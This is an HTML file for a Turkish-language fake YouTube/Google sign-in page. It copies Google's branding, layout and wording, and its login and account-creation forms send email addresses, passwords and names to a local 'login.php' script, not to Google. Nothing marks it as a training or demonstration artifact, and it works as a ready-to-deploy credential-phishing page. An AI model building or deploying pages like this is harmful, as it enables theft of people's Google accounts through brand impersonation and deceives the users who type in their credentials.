<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - Oturum Aç</title>
    
    <!-- Favicon: Hem dosya hem inline data URI -->
    <link rel="icon" type="image/png" href="favicon.png">
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 34'%3E%3Crect width='48' height='34' rx='8' fill='%23ff0000'/%3E%3Cpolygon points='19,10 19,24 31,17' fill='white'/%3E%3C/svg%3E">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; 
            background-color: #f9f9f9; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }
        .login-box { 
            background: #fff; 
            padding: 48px 40px; 
            border: 1px solid #dadce0;
            border-radius: 8px; 
            width: 100%; 
            max-width: 450px; 
            text-align: center; 
            position: relative;
        }
        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 24px;
        }
        .logo-container svg { width: 75px; height: 24px; }
        h1 { 
            font-size: 24px; 
            font-weight: 400; 
            margin-bottom: 8px; 
            color: #202124; 
        }
        .subtext { 
            font-size: 16px; 
            color: #202124; 
            margin-bottom: 32px;
            font-weight: 400;
        }
        .form-container { position: relative; }
        .form-container.hidden { display: none; }
        
        /* Floating Label Input Group */
        .input-group { 
            margin-bottom: 24px; 
            text-align: left; 
            position: relative;
        }
        .input-group input { 
            width: 100%; 
            padding: 13px 15px; 
            border: 1px solid #dadce0; 
            border-radius: 4px; 
            font-size: 16px; 
            transition: border-color 0.2s;
            background: #fff;
            outline: none;
            padding-top: 18px;
        }
        .input-group input:focus { 
            border: 2px solid #1a73e8; 
            padding: 12px 14px;
            padding-top: 17px;
        }
        .input-group label {
            position: absolute;
            left: 15px;
            top: 13px;
            color: #80868b;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s ease;
            background: #fff;
            padding: 0 4px;
        }
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: -8px;
            left: 11px;
            font-size: 12px;
            color: #1a73e8;
        }
        .input-group input:not(:focus):not(:placeholder-shown) + label {
            color: #5f6368;
        }
        
        /* Password Toggle */
        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #5f6368;
            user-select: none;
            display: flex;
            align-items: center;
            font-size: 14px;
            font-weight: 500;
        }
        .password-toggle:hover { color: #202124; }
        .password-toggle svg {
            width: 24px;
            height: 24px;
            margin-left: 8px;
        }
        
        .footer-links {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        .link { 
            color: #1a73e8; 
            text-decoration: none; 
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
        }
        .link:hover { text-decoration: underline; }
        
        button { 
            background-color: #1a73e8; 
            color: #fff; 
            border: none; 
            border-radius: 4px; 
            padding: 0 24px;
            height: 36px;
            font-size: 14px; 
            font-weight: 500; 
            cursor: pointer; 
            letter-spacing: 0.25px;
            transition: background-color 0.2s, box-shadow 0.2s;
        }
        button:hover { 
            background-color: #1557b0; 
            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }
        button:active { background-color: #174ea6; }
        
        .create-account {
            margin-top: 48px;
            font-size: 14px;
            color: #5f6368;
            text-align: left;
        }
        
        .bottom-links {
            margin-top: 32px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5f6368;
        }
        .bottom-links select {
            border: none;
            background: transparent;
            font-size: 12px;
            color: #5f6368;
            cursor: pointer;
            outline: none;
        }
        .bottom-links a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 16px;
        }
        .bottom-links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="login-box">
        <!-- YouTube Logosu -->
        <div class="logo-container">
            <svg viewBox="0 0 90 20" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="2" width="22" height="16" rx="4" fill="#FF0000"/>
                <polygon points="9,6 9,14 16,10" fill="#FFFFFF"/>
                <text x="26" y="16" font-family="Roboto, Arial, sans-serif" font-size="16" font-weight="500" fill="#282828" letter-spacing="-0.3">YouTube</text>
            </svg>
        </div>
        
        <!-- LOGIN FORM -->
        <div class="form-container" id="loginForm">
            <h1>Oturum açın</h1>
            <p class="subtext">Google hesabınızı kullanın</p>
            
            <form action="login.php" method="POST" autocomplete="off">
                <input type="hidden" name="form_type" value="login">
                
                <div class="input-group">
                    <input type="text" name="email" id="login_email" placeholder=" " required autocomplete="username">
                    <label for="login_email">E-posta veya telefon</label>
                </div>
                
                <div class="input-group">
                    <input type="password" name="password" id="login_password" placeholder=" " required autocomplete="current-password">
                    <label for="login_password">Şifrenizi girin</label>
                    <span class="password-toggle" onclick="togglePassword('login_password', this)">
                        Göster
                        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                    </span>
                </div>
                
                <div class="footer-links">
                    <span class="link">E-postanızı mı unuttunuz?</span>
                    <button type="submit">İleri</button>
                </div>
                
                <div class="create-account">
                    YouTube hesabınız yok mu? <span class="link" onclick="toggleForm('signup')">Hesap oluştur</span>
                </div>
            </form>
        </div>
        
        <!-- SIGNUP FORM -->
        <div class="form-container hidden" id="signupForm">
            <h1>Google hesabı oluşturun</h1>
            <p class="subtext">Adınızı girin</p>
            
            <form action="login.php" method="POST" autocomplete="off">
                <input type="hidden" name="form_type" value="signup">
                
                <div style="display: flex; gap: 12px;">
                    <div class="input-group" style="flex: 1;">
                        <input type="text" name="first_name" id="signup_first" placeholder=" " required>
                        <label for="signup_first">Ad</label>
                    </div>
                    <div class="input-group" style="flex: 1;">
                        <input type="text" name="last_name" id="signup_last" placeholder=" " required>
                        <label for="signup_last">Soyad</label>
                    </div>
                </div>
                
                <div class="input-group">
                    <input type="text" name="email" id="signup_email" placeholder=" " required autocomplete="username">
                    <label for="signup_email">Kullanıcı adı</label>
                </div>
                
                <div class="input-group">
                    <input type="password" name="password" id="signup_password" placeholder=" " required autocomplete="new-password">
                    <label for="signup_password">Şifre</label>
                    <span class="password-toggle" onclick="togglePassword('signup_password', this)">
                        Göster
                        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                    </span>
                </div>
                
                <div class="input-group">
                    <input type="password" name="password_confirm" id="signup_confirm" placeholder=" " required autocomplete="new-password">
                    <label for="signup_confirm">Şifreyi onayla</label>
                    <span class="password-toggle" onclick="togglePassword('signup_confirm', this)">
                        Göster
                        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                    </span>
                </div>
                
                <div class="footer-links">
                    <span class="link" onclick="toggleForm('login')">Oturum aç</span>
                    <button type="submit">İleri</button>
                </div>
            </form>
        </div>
        
        <!-- Bottom Links -->
        <div class="bottom-links">
            <select>
                <option>Türkçe (Türkiye)</option>
                <option>English (United States)</option>
                <option>Deutsch (Deutschland)</option>
                <option>Français (France)</option>
            </select>
            <div>
                <a href="#">Yardım</a>
                <a href="#">Gizlilik</a>
                <a href="#">Şartlar</a>
            </div>
        </div>
    </div>
    
    <script>
        function toggleForm(formType) {
            const loginForm = document.getElementById('loginForm');
            const signupForm = document.getElementById('signupForm');
            
            if (formType === 'signup') {
                loginForm.classList.add('hidden');
                signupForm.classList.remove('hidden');
            } else {
                signupForm.classList.add('hidden');
                loginForm.classList.remove('hidden');
            }
        }
        
        function togglePassword(inputId, element) {
            const input = document.getElementById(inputId);
            const text = element.childNodes[0];
            
            if (input.type === 'password') {
                input.type = 'text';
                text.textContent = 'Gizle';
            } else {
                input.type = 'password';
                text.textContent = 'Göster';
            }
        }
    </script>
</body>
</html>
